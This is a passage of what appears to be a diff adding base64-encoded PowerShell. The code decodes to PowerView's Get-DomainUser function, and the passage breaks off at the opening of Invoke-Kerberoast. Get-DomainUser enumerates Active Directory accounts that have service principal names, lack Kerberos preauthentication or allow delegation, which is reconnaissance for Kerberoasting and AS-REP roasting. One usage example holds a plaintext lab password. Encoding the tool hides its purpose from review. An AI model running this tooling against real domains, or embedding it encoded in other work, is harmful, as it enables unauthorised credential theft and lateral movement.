+LERDPWxvY2FsIiAtQWRtaW5Db3VudCAtQWxsb3dEZWxlZ2F0aW9uDQpTZWFyY2gg
+dGhlIHNwZWNpZmllZCBPVSBmb3IgcHJpdmlsZWdlZCB1c2VyIChBZG1pbkNvdW50
+ID0gMSkgdGhhdCBhbGxvdyBkZWxlZ2F0aW9uDQouRVhBTVBMRQ0KR2V0LURvbWFp
+blVzZXIgLUxEQVBGaWx0ZXIgJyghcHJpbWFyeWdyb3VwaWQ9NTEzKScgLVByb3Bl
+cnRpZXMgc2FtYWNjb3VudG5hbWUsbGFzdGxvZ29uDQpTZWFyY2ggZm9yIHVzZXJz
+IHdpdGggYSBwcmltYXJ5IGdyb3VwIElEIG90aGVyIHRoYW4gNTEzICgnZG9tYWlu
+IHVzZXJzJykgYW5kIG9ubHkgcmV0dXJuIHNhbWFjY291bnRuYW1lIGFuZCBsYXN0
+bG9nb24NCi5FWEFNUExFDQpHZXQtRG9tYWluVXNlciAtVUFDRmlsdGVyIERPTlRf
+UkVRX1BSRUFVVEgsTk9UX1BBU1NXT1JEX0VYUElSRUQNCkZpbmQgdXNlcnMgd2hv
+IGRvZXNuJ3QgcmVxdWlyZSBLZXJiZXJvcyBwcmVhdXRoZW50aWNhdGlvbiBhbmQg
+RE9OJ1QgaGF2ZSBhbiBleHBpcmVkIHBhc3N3b3JkLg0KLkVYQU1QTEUNCiRTZWNQ
+YXNzd29yZCA9IENvbnZlcnRUby1TZWN1cmVTdHJpbmcgJ1Bhc3N3b3JkMTIzIScg
+LUFzUGxhaW5UZXh0IC1Gb3JjZQ0KJENyZWQgPSBOZXctT2JqZWN0IFN5c3RlbS5N
+YW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsKCdURVNUTEFCXGRmbS5h
+JywgJFNlY1Bhc3N3b3JkKQ0KR2V0LURvbWFpblVzZXIgLUNyZWRlbnRpYWwgJENy
+ZWQNCi5FWEFNUExFDQpHZXQtRG9tYWluIHwgU2VsZWN0LU9iamVjdCAtRXhwYW5k
+IG5hbWUNCnRlc3RsYWIubG9jYWwNCkdldC1Eb21haW5Vc2VyIGRldlx1c2VyMSAt
+VmVyYm9zZSAtUHJvcGVydGllcyBkaXN0aW5ndWlzaGVkbmFtZQ0KVkVSQk9TRTog
+W0dldC1Eb21haW5TZWFyY2hlcl0gc2VhcmNoIHN0cmluZzogTERBUDovL1BSSU1B
+UlkudGVzdGxhYi5sb2NhbC9EQz10ZXN0bGFiLERDPWxvY2FsDQpWRVJCT1NFOiBb
+R2V0LURvbWFpblNlYXJjaGVyXSBzZWFyY2ggc3RyaW5nOiBMREFQOi8vUFJJTUFS
+WS50ZXN0bGFiLmxvY2FsL0RDPWRldixEQz10ZXN0bGFiLERDPWxvY2FsDQpWRVJC
+T1NFOiBbR2V0LURvbWFpblVzZXJdIGZpbHRlciBzdHJpbmc6ICgmKHNhbUFjY291
+bnRUeXBlPTgwNTMwNjM2OCkofChzYW1BY2NvdW50TmFtZT11c2VyMSkpKQ0KZGlz
+dGluZ3Vpc2hlZG5hbWUNCi0tLS0tLS0tLS0tLS0tLS0tDQpDTj11c2VyMSxDTj1V
+c2VycyxEQz1kZXYsREM9dGVzdGxhYixEQz1sb2NhbA0KLklOUFVUUw0KU3RyaW5n
+DQouT1VUUFVUUw0KUG93ZXJWaWV3LlVzZXINCkN1c3RvbSBQU09iamVjdCB3aXRo
+IHRyYW5zbGF0ZWQgdXNlciBwcm9wZXJ0eSBmaWVsZHMuDQpQb3dlclZpZXcuVXNl
+ci5SYXcNClRoZSByYXcgRGlyZWN0b3J5U2VydmljZXMuU2VhcmNoUmVzdWx0IG9i
+amVjdCwgaWYgLVJhdyBpcyBlbmFibGVkLg0KIz4NCg0KICAgIFtEaWFnbm9zdGlj
+cy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1VzZURl
+Y2xhcmVkVmFyc01vcmVUaGFuQXNzaWdubWVudHMnLCAnJyldDQogICAgW0RpYWdu
+b3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BT
+U2hvdWxkUHJvY2VzcycsICcnKV0NCiAgICBbT3V0cHV0VHlwZSgnUG93ZXJWaWV3
+LlVzZXInKV0NCiAgICBbT3V0cHV0VHlwZSgnUG93ZXJWaWV3LlVzZXIuUmF3Jyld
+DQogICAgW0NtZGxldEJpbmRpbmcoRGVmYXVsdFBhcmFtZXRlclNldE5hbWUgPSAn
+QWxsb3dEZWxlZ2F0aW9uJyldDQogICAgUGFyYW0oDQogICAgICAgIFtQYXJhbWV0
+ZXIoUG9zaXRpb24gPSAwLCBWYWx1ZUZyb21QaXBlbGluZSA9ICRUcnVlLCBWYWx1
+ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJFRydWUpXQ0KICAgICAgICBb
+QWxpYXMoJ0Rpc3Rpbmd1aXNoZWROYW1lJywgJ1NhbUFjY291bnROYW1lJywgJ05h
+bWUnLCAnTWVtYmVyRGlzdGluZ3Vpc2hlZE5hbWUnLCAnTWVtYmVyTmFtZScpXQ0K
+ICAgICAgICBbU3RyaW5nW11dDQogICAgICAgICRJZGVudGl0eSwNCg0KICAgICAg
+ICBbU3dpdGNoXQ0KICAgICAgICAkU1BOLA0KDQogICAgICAgIFtTd2l0Y2hdDQog
+ICAgICAgICRBZG1pbkNvdW50LA0KDQogICAgICAgIFtQYXJhbWV0ZXIoUGFyYW1l
+dGVyU2V0TmFtZSA9ICdBbGxvd0RlbGVnYXRpb24nKV0NCiAgICAgICAgW1N3aXRj
+aF0NCiAgICAgICAgJEFsbG93RGVsZWdhdGlvbiwNCg0KICAgICAgICBbUGFyYW1l
+dGVyKFBhcmFtZXRlclNldE5hbWUgPSAnRGlzYWxsb3dEZWxlZ2F0aW9uJyldDQog
+ICAgICAgIFtTd2l0Y2hdDQogICAgICAgICREaXNhbGxvd0RlbGVnYXRpb24sDQoN
+CiAgICAgICAgW1N3aXRjaF0NCiAgICAgICAgJFRydXN0ZWRUb0F1dGgsDQoNCiAg
+ICAgICAgW0FsaWFzKCdLZXJiZXJvc1ByZWF1dGhOb3RSZXF1aXJlZCcsICdOb1By
+ZWF1dGgnKV0NCiAgICAgICAgW1N3aXRjaF0NCiAgICAgICAgJFByZWF1dGhOb3RS
+ZXF1aXJlZCwNCg0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQ0K
+ICAgICAgICBbU3RyaW5nXQ0KICAgICAgICAkRG9tYWluLA0KDQogICAgICAgIFtW
+YWxpZGF0ZU5vdE51bGxPckVtcHR5KCldDQogICAgICAgIFtBbGlhcygnRmlsdGVy
+JyldDQogICAgICAgIFtTdHJpbmddDQogICAgICAgICRMREFQRmlsdGVyLA0KDQog
+ICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldDQogICAgICAgIFtTdHJp
+bmdbXV0NCiAgICAgICAgJFByb3BlcnRpZXMsDQoNCiAgICAgICAgW1ZhbGlkYXRl
+Tm90TnVsbE9yRW1wdHkoKV0NCiAgICAgICAgW0FsaWFzKCdBRFNQYXRoJyldDQog
+ICAgICAgIFtTdHJpbmddDQogICAgICAgICRTZWFyY2hCYXNlLA0KDQogICAgICAg
+IFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldDQogICAgICAgIFtBbGlhcygnRG9t
+YWluQ29udHJvbGxlcicpXQ0KICAgICAgICBbU3RyaW5nXQ0KICAgICAgICAkU2Vy
+dmVyLA0KDQogICAgICAgIFtWYWxpZGF0ZVNldCgnQmFzZScsICdPbmVMZXZlbCcs
+ICdTdWJ0cmVlJyldDQogICAgICAgIFtTdHJpbmddDQogICAgICAgICRTZWFyY2hT
+Y29wZSA9ICdTdWJ0cmVlJywNCg0KICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAx
+MDAwMCldDQogICAgICAgIFtJbnRdDQogICAgICAgICRSZXN1bHRQYWdlU2l6ZSA9
+IDIwMCwNCg0KICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMCldDQogICAg
+ICAgIFtJbnRdDQogICAgICAgICRTZXJ2ZXJUaW1lTGltaXQsDQoNCiAgICAgICAg
+W1ZhbGlkYXRlU2V0KCdEYWNsJywgJ0dyb3VwJywgJ05vbmUnLCAnT3duZXInLCAn
+U2FjbCcpXQ0KICAgICAgICBbU3RyaW5nXQ0KICAgICAgICAkU2VjdXJpdHlNYXNr
+cywNCg0KICAgICAgICBbU3dpdGNoXQ0KICAgICAgICAkVG9tYnN0b25lLA0KDQog
+ICAgICAgIFtBbGlhcygnUmV0dXJuT25lJyldDQogICAgICAgIFtTd2l0Y2hdDQog
+ICAgICAgICRGaW5kT25lLA0KDQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRp
+b24uUFNDcmVkZW50aWFsXQ0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9u
+LkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0NCiAgICAgICAgJENyZWRlbnRpYWwgPSBb
+TWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5LA0KDQog
+ICAgICAgIFtTd2l0Y2hdDQogICAgICAgICRSYXcNCiAgICApDQo8Iw0KICAgIER5
+bmFtaWNQYXJhbSB7DQogICAgICAgICRVQUNWYWx1ZU5hbWVzID0gW0VudW1dOjpH
+ZXROYW1lcygkVUFDRW51bSkNCiAgICAgICAgIyBhZGQgaW4gdGhlIG5lZ2F0aW9u
+cw0KICAgICAgICAkVUFDVmFsdWVOYW1lcyA9ICRVQUNWYWx1ZU5hbWVzIHwgRm9y
+RWFjaC1PYmplY3QgeyRfOyAiTk9UXyRfIn0NCiAgICAgICAgIyBjcmVhdGUgbmV3
+IGR5bmFtaWMgcGFyYW1ldGVyDQogICAgICAgIE5ldy1EeW5hbWljUGFyYW1ldGVy
+IC1OYW1lIFVBQ0ZpbHRlciAtVmFsaWRhdGVTZXQgJFVBQ1ZhbHVlTmFtZXMgLVR5
+cGUgKFthcnJheV0pDQogICAgfQ0KIz4NCiAgICBCRUdJTiB7DQogICAgICAgICRT
+ZWFyY2hlckFyZ3VtZW50cyA9IEB7fQ0KICAgICAgICBpZiAoJFBTQm91bmRQYXJh
+bWV0ZXJzWydEb21haW4nXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ0RvbWFpbidd
+ID0gJERvbWFpbiB9DQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1By
+b3BlcnRpZXMnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1Byb3BlcnRpZXMnXSA9
+ICRQcm9wZXJ0aWVzIH0NCiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1sn
+U2VhcmNoQmFzZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VhcmNoQmFzZSdd
+ID0gJFNlYXJjaEJhc2UgfQ0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJz
+WydTZXJ2ZXInXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlciddID0gJFNl
+cnZlciB9DQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaFNj
+b3BlJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZWFyY2hTY29wZSddID0gJFNl
+YXJjaFNjb3BlIH0NCiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUmVz
+dWx0UGFnZVNpemUnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1Jlc3VsdFBhZ2VT
+aXplJ10gPSAkUmVzdWx0UGFnZVNpemUgfQ0KICAgICAgICBpZiAoJFBTQm91bmRQ
+YXJhbWV0ZXJzWydTZXJ2ZXJUaW1lTGltaXQnXSkgeyAkU2VhcmNoZXJBcmd1bWVu
+dHNbJ1NlcnZlclRpbWVMaW1pdCddID0gJFNlcnZlclRpbWVMaW1pdCB9DQogICAg
+ICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlY3VyaXR5TWFza3MnXSkgeyAk
+U2VhcmNoZXJBcmd1bWVudHNbJ1NlY3VyaXR5TWFza3MnXSA9ICRTZWN1cml0eU1h
+c2tzIH0NCiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVG9tYnN0b25l
+J10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydUb21ic3RvbmUnXSA9ICRUb21ic3Rv
+bmUgfQ0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFs
+J10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVu
+dGlhbCB9DQogICAgICAgICRVc2VyU2VhcmNoZXIgPSBHZXQtRG9tYWluU2VhcmNo
+ZXIgQFNlYXJjaGVyQXJndW1lbnRzDQogICAgfQ0KDQogICAgUFJPQ0VTUyB7DQog
+ICAgICAgICNiaW5kIGR5bmFtaWMgcGFyYW1ldGVyIHRvIGEgZnJpZW5kbHkgdmFy
+aWFibGUNCiAgICAgICAgI2lmICgkUFNCb3VuZFBhcmFtZXRlcnMgLWFuZCAoJFBT
+Qm91bmRQYXJhbWV0ZXJzLkNvdW50IC1uZSAwKSkgew0KICAgICAgICAjICAgIE5l
+dy1EeW5hbWljUGFyYW1ldGVyIC1DcmVhdGVWYXJpYWJsZXMgLUJvdW5kUGFyYW1l
+dGVycyAkUFNCb3VuZFBhcmFtZXRlcnMNCiAgICAgICAgI30NCg0KICAgICAgICBp
+ZiAoJFVzZXJTZWFyY2hlcikgew0KICAgICAgICAgICAgJElkZW50aXR5RmlsdGVy
+ID0gJycNCiAgICAgICAgICAgICRGaWx0ZXIgPSAnJw0KICAgICAgICAgICAgJElk
+ZW50aXR5IHwgV2hlcmUtT2JqZWN0IHskX30gfCBGb3JFYWNoLU9iamVjdCB7DQog
+ICAgICAgICAgICAgICAgJElkZW50aXR5SW5zdGFuY2UgPSAkXy5SZXBsYWNlKCco
+JywgJ1wyOCcpLlJlcGxhY2UoJyknLCAnXDI5JykNCiAgICAgICAgICAgICAgICBp
+ZiAoJElkZW50aXR5SW5zdGFuY2UgLW1hdGNoICdeUy0xLScpIHsNCiAgICAgICAg
+ICAgICAgICAgICAgJElkZW50aXR5RmlsdGVyICs9ICIob2JqZWN0c2lkPSRJZGVu
+dGl0eUluc3RhbmNlKSINCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAg
+ICAgZWxzZWlmICgkSWRlbnRpdHlJbnN0YW5jZSAtbWF0Y2ggJ15DTj0nKSB7DQog
+ICAgICAgICAgICAgICAgICAgICRJZGVudGl0eUZpbHRlciArPSAiKGRpc3Rpbmd1
+aXNoZWRuYW1lPSRJZGVudGl0eUluc3RhbmNlKSINCiAgICAgICAgICAgICAgICAg
+ICAgaWYgKCgtbm90ICRQU0JvdW5kUGFyYW1ldGVyc1snRG9tYWluJ10pIC1hbmQg
+KC1ub3QgJFBTQm91bmRQYXJhbWV0ZXJzWydTZWFyY2hCYXNlJ10pKSB7DQogICAg
+ICAgICAgICAgICAgICAgICAgICAjIGlmIGEgLURvbWFpbiBpc24ndCBleHBsaWNp
+dGx5IHNldCwgZXh0cmFjdCB0aGUgb2JqZWN0IGRvbWFpbiBvdXQgb2YgdGhlIGRp
+c3Rpbmd1aXNoZWRuYW1lDQogICAgICAgICAgICAgICAgICAgICAgICAjICAgYW5k
+IHJlYnVpbGQgdGhlIGRvbWFpbiBzZWFyY2hlcg0KICAgICAgICAgICAgICAgICAg
+ICAgICAgJElkZW50aXR5RG9tYWluID0gJElkZW50aXR5SW5zdGFuY2UuU3ViU3Ry
+aW5nKCRJZGVudGl0eUluc3RhbmNlLkluZGV4T2YoJ0RDPScpKSAtcmVwbGFjZSAn
+REM9JywnJyAtcmVwbGFjZSAnLCcsJy4nDQogICAgICAgICAgICAgICAgICAgICAg
+ICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpblVzZXJdIEV4dHJhY3RlZCBkb21h
+aW4gJyRJZGVudGl0eURvbWFpbicgZnJvbSAnJElkZW50aXR5SW5zdGFuY2UnIg0K
+ICAgICAgICAgICAgICAgICAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzWydEb21h
+aW4nXSA9ICRJZGVudGl0eURvbWFpbg0KICAgICAgICAgICAgICAgICAgICAgICAg
+JFVzZXJTZWFyY2hlciA9IEdldC1Eb21haW5TZWFyY2hlciBAU2VhcmNoZXJBcmd1
+bWVudHMNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgtbm90ICRVc2VyU2Vh
+cmNoZXIpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1XYXJu
+aW5nICJbR2V0LURvbWFpblVzZXJdIFVuYWJsZSB0byByZXRyaWV2ZSBkb21haW4g
+c2VhcmNoZXIgZm9yICckSWRlbnRpdHlEb21haW4nIg0KICAgICAgICAgICAgICAg
+ICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAg
+ICAgfQ0KICAgICAgICAgICAgICAgIGVsc2VpZiAoJElkZW50aXR5SW5zdGFuY2Ug
+LWltYXRjaCAnXlswLTlBLUZdezh9LShbMC05QS1GXXs0fS0pezN9WzAtOUEtRl17
+MTJ9JCcpIHsNCiAgICAgICAgICAgICAgICAgICAgJEd1aWRCeXRlU3RyaW5nID0g
+KChbR3VpZF0kSWRlbnRpdHlJbnN0YW5jZSkuVG9CeXRlQXJyYXkoKSB8IEZvckVh
+Y2gtT2JqZWN0IHsgJ1wnICsgJF8uVG9TdHJpbmcoJ1gyJykgfSkgLWpvaW4gJycN
+CiAgICAgICAgICAgICAgICAgICAgJElkZW50aXR5RmlsdGVyICs9ICIob2JqZWN0
+Z3VpZD0kR3VpZEJ5dGVTdHJpbmcpIg0KICAgICAgICAgICAgICAgIH0NCiAgICAg
+ICAgICAgICAgICBlbHNlaWYgKCRJZGVudGl0eUluc3RhbmNlLkNvbnRhaW5zKCdc
+JykpIHsNCiAgICAgICAgICAgICAgICAgICAgJENvbnZlcnRlZElkZW50aXR5SW5z
+dGFuY2UgPSAkSWRlbnRpdHlJbnN0YW5jZS5SZXBsYWNlKCdcMjgnLCAnKCcpLlJl
+cGxhY2UoJ1wyOScsICcpJykgfCBDb252ZXJ0LUFETmFtZSAtT3V0cHV0VHlwZSBD
+YW5vbmljYWwNCiAgICAgICAgICAgICAgICAgICAgaWYgKCRDb252ZXJ0ZWRJZGVu
+dGl0eUluc3RhbmNlKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAkVXNlckRv
+bWFpbiA9ICRDb252ZXJ0ZWRJZGVudGl0eUluc3RhbmNlLlN1YlN0cmluZygwLCAk
+Q29udmVydGVkSWRlbnRpdHlJbnN0YW5jZS5JbmRleE9mKCcvJykpDQogICAgICAg
+ICAgICAgICAgICAgICAgICAkVXNlck5hbWUgPSAkSWRlbnRpdHlJbnN0YW5jZS5T
+cGxpdCgnXCcpWzFdDQogICAgICAgICAgICAgICAgICAgICAgICAkSWRlbnRpdHlG
+aWx0ZXIgKz0gIihzYW1BY2NvdW50TmFtZT0kVXNlck5hbWUpIg0KICAgICAgICAg
+ICAgICAgICAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzWydEb21haW4nXSA9ICRV
+c2VyRG9tYWluDQogICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3Nl
+ICJbR2V0LURvbWFpblVzZXJdIEV4dHJhY3RlZCBkb21haW4gJyRVc2VyRG9tYWlu
+JyBmcm9tICckSWRlbnRpdHlJbnN0YW5jZSciDQogICAgICAgICAgICAgICAgICAg
+ICAgICAkVXNlclNlYXJjaGVyID0gR2V0LURvbWFpblNlYXJjaGVyIEBTZWFyY2hl
+ckFyZ3VtZW50cw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAg
+ICAgfQ0KICAgICAgICAgICAgICAgIGVsc2Ugew0KICAgICAgICAgICAgICAgICAg
+ICAkSWRlbnRpdHlGaWx0ZXIgKz0gIihzYW1BY2NvdW50TmFtZT0kSWRlbnRpdHlJ
+bnN0YW5jZSkiDQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KDQog
+ICAgICAgICAgICBpZiAoJElkZW50aXR5RmlsdGVyIC1hbmQgKCRJZGVudGl0eUZp
+bHRlci5UcmltKCkgLW5lICcnKSApIHsNCiAgICAgICAgICAgICAgICAkRmlsdGVy
+ICs9ICIofCRJZGVudGl0eUZpbHRlcikiDQogICAgICAgICAgICB9DQoNCiAgICAg
+ICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NQTiddKSB7DQogICAgICAg
+ICAgICAgICAgV3JpdGUtVmVyYm9zZSAnW0dldC1Eb21haW5Vc2VyXSBTZWFyY2hp
+bmcgZm9yIG5vbi1udWxsIHNlcnZpY2UgcHJpbmNpcGFsIG5hbWVzJw0KICAgICAg
+ICAgICAgICAgICRGaWx0ZXIgKz0gJyhzZXJ2aWNlUHJpbmNpcGFsTmFtZT0qKScN
+CiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRl
+cnNbJ0FsbG93RGVsZWdhdGlvbiddKSB7DQogICAgICAgICAgICAgICAgV3JpdGUt
+VmVyYm9zZSAnW0dldC1Eb21haW5Vc2VyXSBTZWFyY2hpbmcgZm9yIHVzZXJzIHdo
+byBjYW4gYmUgZGVsZWdhdGVkJw0KICAgICAgICAgICAgICAgICMgbmVnYXRpb24g
+b2YgIkFjY291bnRzIHRoYXQgYXJlIHNlbnNpdGl2ZSBhbmQgbm90IHRydXN0ZWQg
+Zm9yIGRlbGVnYXRpb24iDQogICAgICAgICAgICAgICAgJEZpbHRlciArPSAnKCEo
+dXNlckFjY291bnRDb250cm9sOjEuMi44NDAuMTEzNTU2LjEuNC44MDM6PTEwNDg1
+NzQpKScNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBh
+cmFtZXRlcnNbJ0Rpc2FsbG93RGVsZWdhdGlvbiddKSB7DQogICAgICAgICAgICAg
+ICAgV3JpdGUtVmVyYm9zZSAnW0dldC1Eb21haW5Vc2VyXSBTZWFyY2hpbmcgZm9y
+IHVzZXJzIHdobyBhcmUgc2Vuc2l0aXZlIGFuZCBub3QgdHJ1c3RlZCBmb3IgZGVs
+ZWdhdGlvbicNCiAgICAgICAgICAgICAgICAkRmlsdGVyICs9ICcodXNlckFjY291
+bnRDb250cm9sOjEuMi44NDAuMTEzNTU2LjEuNC44MDM6PTEwNDg1NzQpJw0KICAg
+ICAgICAgICAgfQ0KICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1sn
+QWRtaW5Db3VudCddKSB7DQogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAn
+W0dldC1Eb21haW5Vc2VyXSBTZWFyY2hpbmcgZm9yIGFkbWluQ291bnQ9MScNCiAg
+ICAgICAgICAgICAgICAkRmlsdGVyICs9ICcoYWRtaW5jb3VudD0xKScNCiAgICAg
+ICAgICAgIH0NCiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1Ry
+dXN0ZWRUb0F1dGgnXSkgew0KICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2Ug
+J1tHZXQtRG9tYWluVXNlcl0gU2VhcmNoaW5nIGZvciB1c2VycyB0aGF0IGFyZSB0
+cnVzdGVkIHRvIGF1dGhlbnRpY2F0ZSBmb3Igb3RoZXIgcHJpbmNpcGFscycNCiAg
+ICAgICAgICAgICAgICAkRmlsdGVyICs9ICcobXNkcy1hbGxvd2VkdG9kZWxlZ2F0
+ZXRvPSopJw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgaWYgKCRQU0JvdW5k
+UGFyYW1ldGVyc1snUHJlYXV0aE5vdFJlcXVpcmVkJ10pIHsNCiAgICAgICAgICAg
+ICAgICBXcml0ZS1WZXJib3NlICdbR2V0LURvbWFpblVzZXJdIFNlYXJjaGluZyBm
+b3IgdXNlciBhY2NvdW50cyB0aGF0IGRvIG5vdCByZXF1aXJlIGtlcmJlcm9zIHBy
+ZWF1dGhlbnRpY2F0ZScNCiAgICAgICAgICAgICAgICAkRmlsdGVyICs9ICcodXNl
+ckFjY291bnRDb250cm9sOjEuMi44NDAuMTEzNTU2LjEuNC44MDM6PTQxOTQzMDQp
+Jw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1l
+dGVyc1snTERBUEZpbHRlciddKSB7DQogICAgICAgICAgICAgICAgV3JpdGUtVmVy
+Ym9zZSAiW0dldC1Eb21haW5Vc2VyXSBVc2luZyBhZGRpdGlvbmFsIExEQVAgZmls
+dGVyOiAkTERBUEZpbHRlciINCiAgICAgICAgICAgICAgICAkRmlsdGVyICs9ICIk
+TERBUEZpbHRlciINCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgIyBidWls
+ZCB0aGUgTERBUCBmaWx0ZXIgZm9yIHRoZSBkeW5hbWljIFVBQyBmaWx0ZXIgdmFs
+dWUNCiAgICAgICAgICAgICRVQUNGaWx0ZXIgfCBXaGVyZS1PYmplY3QgeyRffSB8
+IEZvckVhY2gtT2JqZWN0IHsNCiAgICAgICAgICAgICAgICBpZiAoJF8gLW1hdGNo
+ICdOT1RfLionKSB7DQogICAgICAgICAgICAgICAgICAgICRVQUNGaWVsZCA9ICRf
+LlN1YnN0cmluZyg0KQ0KICAgICAgICAgICAgICAgICAgICAkVUFDVmFsdWUgPSBb
+SW50XSgkVUFDRW51bTo6JFVBQ0ZpZWxkKQ0KICAgICAgICAgICAgICAgICAgICAk
+RmlsdGVyICs9ICIoISh1c2VyQWNjb3VudENvbnRyb2w6MS4yLjg0MC4xMTM1NTYu
+MS40LjgwMzo9JFVBQ1ZhbHVlKSkiDQogICAgICAgICAgICAgICAgfQ0KICAgICAg
+ICAgICAgICAgIGVsc2Ugew0KICAgICAgICAgICAgICAgICAgICAkVUFDVmFsdWUg
+PSBbSW50XSgkVUFDRW51bTo6JF8pDQogICAgICAgICAgICAgICAgICAgICRGaWx0
+ZXIgKz0gIih1c2VyQWNjb3VudENvbnRyb2w6MS4yLjg0MC4xMTM1NTYuMS40Ljgw
+Mzo9JFVBQ1ZhbHVlKSINCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9
+DQoNCiAgICAgICAgICAgICRVc2VyU2VhcmNoZXIuZmlsdGVyID0gIigmKHNhbUFj
+Y291bnRUeXBlPTgwNTMwNjM2OCkkRmlsdGVyKSINCiAgICAgICAgICAgIFdyaXRl
+LVZlcmJvc2UgIltHZXQtRG9tYWluVXNlcl0gZmlsdGVyIHN0cmluZzogJCgkVXNl
+clNlYXJjaGVyLmZpbHRlcikiDQoNCiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBh
+cmFtZXRlcnNbJ0ZpbmRPbmUnXSkgeyAkUmVzdWx0cyA9ICRVc2VyU2VhcmNoZXIu
+RmluZE9uZSgpIH0NCiAgICAgICAgICAgIGVsc2UgeyAkUmVzdWx0cyA9ICRVc2Vy
+U2VhcmNoZXIuRmluZEFsbCgpIH0NCiAgICAgICAgICAgICRSZXN1bHRzIHwgV2hl
+cmUtT2JqZWN0IHskX30gfCBGb3JFYWNoLU9iamVjdCB7DQogICAgICAgICAgICAg
+ICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUmF3J10pIHsNCiAgICAgICAgICAg
+ICAgICAgICAgIyByZXR1cm4gcmF3IHJlc3VsdCBvYmplY3RzDQogICAgICAgICAg
+ICAgICAgICAgICRVc2VyID0gJF8NCiAgICAgICAgICAgICAgICAgICAgJFVzZXIu
+UFNPYmplY3QuVHlwZU5hbWVzLkluc2VydCgwLCAnUG93ZXJWaWV3LlVzZXIuUmF3
+JykNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgZWxzZSB7DQog
+ICAgICAgICAgICAgICAgICAgICRVc2VyID0gQ29udmVydC1MREFQUHJvcGVydHkg
+LVByb3BlcnRpZXMgJF8uUHJvcGVydGllcw0KICAgICAgICAgICAgICAgICAgICAk
+VXNlci5QU09iamVjdC5UeXBlTmFtZXMuSW5zZXJ0KDAsICdQb3dlclZpZXcuVXNl
+cicpDQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICRVc2VyDQog
+ICAgICAgICAgICB9DQogICAgICAgICAgICBpZiAoJFJlc3VsdHMpIHsNCiAgICAg
+ICAgICAgICAgICB0cnkgeyAkUmVzdWx0cy5kaXNwb3NlKCkgfQ0KICAgICAgICAg
+ICAgICAgIGNhdGNoIHsNCiAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9z
+ZSAiW0dldC1Eb21haW5Vc2VyXSBFcnJvciBkaXNwb3Npbmcgb2YgdGhlIFJlc3Vs
+dHMgb2JqZWN0OiAkXyINCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9
+DQogICAgICAgICAgICAkVXNlclNlYXJjaGVyLmRpc3Bvc2UoKQ0KICAgICAgICB9
+DQogICAgfQ0KfQ0KDQoNCmZ1bmN0aW9uIEludm9rZS1LZXJiZXJvYXN0IHsNCjwj
+DQouU1lOT1BTSVMNClJlcXVlc3RzIHNlcnZpY2UgdGlja2V0cyBmb3Iga2VyYmVy
